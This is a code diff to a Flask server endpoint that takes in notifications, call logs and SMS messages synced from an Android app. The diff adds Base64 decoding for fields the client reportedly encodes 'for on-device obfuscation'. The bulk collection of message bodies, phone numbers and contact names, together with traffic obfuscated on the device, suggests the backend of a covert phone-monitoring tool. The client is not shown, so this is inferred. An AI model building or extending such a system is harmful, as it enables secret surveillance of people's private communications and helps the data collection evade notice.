@@ -158,22 +158,28 @@ def require_login(f):
 # ─── API Endpoints ───────────────────────────────────────────────────
 
 
+import base64
+
+def decode_field(val):
+    """
+    Decodes an encoded string from the mobile client.
+    Gracefully returns the original string if it is not Base64-encoded.
+    """
+    if not val or not isinstance(val, str):
+        return val
+    try:
+        decoded_bytes = base64.b64decode(val.encode('ascii'), validate=True)
+        return decoded_bytes.decode('utf-8')
+    except Exception:
+        return val
+
+
 @app.route('/api/v1/sync', methods=['POST'])
 @require_api_key
 def sync_data():
     """
     Receives all data types in a single batch from the Android app.
-    
-    Expected JSON payload:
-    {
-      "device_id": "...",
-      "device_model": "...",
-      "android_version": "...",
-      "app_version": "...",
-      "notifications": [...],
-      "call_logs": [...],
-      "sms_messages": [...]
-    }
+    Fields may be Base64-encoded by the client for on-device obfuscation.
     """
     data = request.get_json(silent=True)
     if not data:
@@ -218,9 +224,9 @@ def sync_data():
             notif = Notification(
                 device_id=device_id,
                 app_package=n.get('app_package', 'unknown'),
-                app_name=n.get('app_name'),
-                title=n.get('title'),
-                content=n.get('content'),
+                app_name=decode_field(n.get('app_name')),
+                title=decode_field(n.get('title')),
+                content=decode_field(n.get('content')),
                 category=n.get('category'),
                 received_at=received_at,
                 synced_at=now
@@ -239,8 +245,8 @@ def sync_data():
             occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
             call = CallLog(
                 device_id=device_id,
-                phone_number=c.get('phone_number', 'unknown'),
-                contact_name=c.get('contact_name'),
+                phone_number=decode_field(c.get('phone_number', 'unknown')),
+                contact_name=decode_field(c.get('contact_name')),
                 call_type=c.get('call_type', 'unknown'),
                 duration_sec=int(c.get('duration_sec', 0)),
                 occurred_at=occurred_at,
@@ -260,9 +266,9 @@ def sync_data():
             occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
             sms = SmsMessage(
                 device_id=device_id,
-                address=s.get('address', 'unknown'),
-                contact_name=s.get('contact_name'),
-                body=s.get('body'),
+                address=decode_field(s.get('address', 'unknown')),
+                contact_name=decode_field(s.get('contact_name')),
+                body=decode_field(s.get('body')),
                 sms_type=s.get('sms_type', 'unknown'),
                 occurred_at=occurred_at,
                 synced_at=now
@@ -274,6 +280,7 @@ def sync_data():
             app.logger.error(f"Error parsing SMS item: {e}")
 
     db.session.commit()
+
 
     return jsonify({
         'status': 'ok',
